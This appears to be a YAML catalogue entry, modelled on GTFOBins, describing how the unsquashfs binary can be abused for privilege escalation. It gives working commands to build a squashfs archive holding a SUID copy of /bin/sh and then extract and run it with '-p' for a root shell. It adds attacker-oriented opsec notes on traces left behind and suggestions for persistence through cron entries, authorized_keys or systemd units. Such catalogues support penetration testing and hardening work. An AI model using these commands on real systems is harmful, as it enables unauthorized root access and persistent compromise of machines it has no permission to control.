---
name: unsquashfs
capabilities:
- exec
- suid
required_permissions:
  level: suid
  notes: Requires SUID bit set on the binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: |-
    `unsquashfs` preserve the SUID bit when extracting the file system. For example, prepare an archive beforehand with the following commands as root:

    ```
    cp /bin/sh .
    chmod +s sh
    mksquashfs sh shell
    ```
persistence_potential: true
examples:
- id: privilege-escalation
  description: Escalate to root via this binary.
  capabilities:
  - exec
  - suid
  command: |-
    unsquashfs shell
    ./squashfs-root/sh -p
references:
- https://gtfobins.github.io/gtfobins/unsquashfs/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
